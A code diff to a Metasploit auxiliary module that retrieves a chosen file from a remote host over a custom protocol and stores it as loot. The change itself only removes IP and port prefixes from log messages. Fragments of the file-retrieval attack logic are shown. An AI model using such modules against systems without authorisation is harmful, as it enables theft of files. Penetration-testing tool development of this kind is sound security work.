@@ -51,7 +51,7 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     # No point to continue if no filename is specified
     if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
-      print_error("#{ip}:#{rport} - Please supply the name of the file you want to download")
+      print_error("Please supply the name of the file you want to download")
       return
     end
 
@@ -73,7 +73,7 @@ class MetasploitModule < Msf::Auxiliary
     response = sock.get_once(5, 1) || ''
 
     if response.unpack("C").first != 0x78
-      print_error "#{ip}:#{rport} - Error opening file"
+      print_error "Error opening file"
       return
     end
     # The stream allows to identify our file since the
@@ -92,7 +92,7 @@ class MetasploitModule < Msf::Auxiliary
     response = sock.get_once(5, 1) || ''
 
     if response.unpack("C").first != 0x79
-      print_error "#{ip}:#{rport} - Error getting the file length"
+      print_error "Error getting the file length"
       return
     end
     file_length = response[1, 4].unpack("V").first
@@ -113,7 +113,7 @@ class MetasploitModule < Msf::Auxiliary
         response << sock.get_once(0x7ac - response.length, 5) || ''
       end
       if response.unpack("C").first != 0x98
-        print_error "#{ip}:#{rport} - Error reading the file, anyway we're going to try to finish"
+        print_error "Error reading the file, anyway we're going to try to finish"
       end
 
       if (file_length - contents.length) < response.length - 9
@@ -132,12 +132,12 @@ class MetasploitModule < Msf::Auxiliary
     sock.put(packet)
     response = sock.get_once(-1, 1) || ''
     if response.unpack("C").first != 0x7B
-      print_error "#{ip}:#{rport} - Error closing file file, anyway we're going to try to finish"
+      print_error "Error closing file file, anyway we're going to try to finish"
     end
 
     disconnect
 
-    print_good "#{ip}:#{rport} - File retrieved successfully!"
+    print_good "File retrieved successfully!"
 
     fname = File.basename(datastore['FILEPATH'])
     path = store_loot(
@@ -148,6 +148,6 @@ class MetasploitModule < Msf::Auxiliary
       fname,
       datastore['FILEPATH']
     )
-    print_status("#{ip}:#{rport} - File saved in: #{path}")
+    print_status("File saved in: #{path}")
   end
 end
